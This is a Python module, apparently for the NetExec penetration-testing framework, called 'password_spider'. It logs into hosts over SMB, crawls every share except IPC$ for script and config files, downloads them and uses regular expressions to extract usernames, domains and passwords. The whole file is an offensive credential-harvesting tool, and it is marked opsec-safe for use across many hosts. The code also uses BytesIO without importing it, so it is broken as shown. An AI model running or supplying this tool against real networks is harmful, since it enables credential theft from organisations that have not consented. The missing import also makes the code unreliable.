import re

class NXCModule:
    """
    Optimized version to search all SMB shares for specific files and look for credentials in files.
    """

    name = "password_spider"
    description = "Searches all SMB shares (except IPC$) for specific files and looks for credentials within those files."
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """ Method for additional options (if needed) """

    def on_login(self, context, connection):
        # Get all SMB shares
        shares = connection.shares()

        # Iterate over shares
        for share in shares:
            share_name = share["name"]

            # Skip IPC$ share
            if share_name == "IPC$":
                continue

            # Log the found share
            context.log.success(f"Found share: {share_name}")

            # Search for files with the specified extensions
            context.log.display("Searching for specific files in share...")
            paths = connection.spider(share_name, pattern=[".cmd", ".bat", ".ps1", ".inf", ".info", ".psd"])

            # Iterate over found files
            for path in paths:
                context.log.display(f"Found file: {path}")

                # Fetch the file content
                buf = BytesIO()
                connection.conn.getFile(share_name, path, buf.write)
                file_content = buf.getvalue().decode(errors="ignore")  # Ensure text encoding issues are handled

                # Search for credentials in the file content using regular expressions
                self.search_for_credentials(file_content, context, path)

    def search_for_credentials(self, file_content, context, file_path):
        """
        Search the file content for potential credentials.
        """
        # Define patterns to search for, including domain/username and password pairs
        patterns = [
            r"([A-Za-z0-9_-]+\\[A-Za-z0-9_-]+)",  # Domain\Username
            r"(?:user|username|login)[\s:=]*([A-Za-z0-9_@.-]+)",  # user=username, username: user, etc.
            r"(?:pass|password)[\s:=]*([A-Za-z0-9!@#$%^&*()_+={}\[\];:,.<>?/-]+)",  # pass=xxxx or password=xxx
            r"(?:domain)[\s:=]*([A-Za-z0-9_]+)",  # domain=xxx
            r"([A-Za-z0-9]+)\\([A-Za-z0-9]+)[\s:=]*([A-Za-z0-9!@#$%^&*()_+={}\[\];:,.<>?/-]+)",  # domain\username password format
            r"%USERNAME%",  # Possible environment variable for username
            r"%USERDOMAIN%",  # Possible environment variable for domain
            r"%PASSWORD%",  # Possible environment variable for password
            r"net use \\\.* /user:(\S+)",  # net use with a username
            r"password\s*=\s*['\"](.*?)['\"]",  # generic password pattern
            r"runas /user:(\S+)",  # runas command
            r"net groups.* /domain",  # net groups command
            r"net share.* /domain",  # net share command
            r"Domain:\s*(\S+)",  # Generic domain patterns
        ]

        found_usernames = []
        found_passwords = []
        found_domains = []

        # Search for usernames, passwords, and domains using the patterns
        for pattern in patterns:
            for match in re.finditer(pattern, file_content, re.IGNORECASE):
                if pattern in [patterns[0], patterns[1], patterns[4]]:
                    found_usernames.append(match.group(1))
                elif pattern in [patterns[2]]:
                    found_passwords.append(match.group(1))
                elif pattern in [patterns[3]]:
                    found_domains.append(match.group(1))

        # Log found credentials
        if found_usernames or found_passwords or found_domains:
            context.log.success(f"Found credentials in {file_path}")
            if found_usernames:
                context.log.highlight(f"Usernames: {found_usernames}")
            if found_domains:
                context.log.highlight(f"Domains: {found_domains}")
            if found_passwords:
                context.log.highlight(f"Passwords: {found_passwords}")
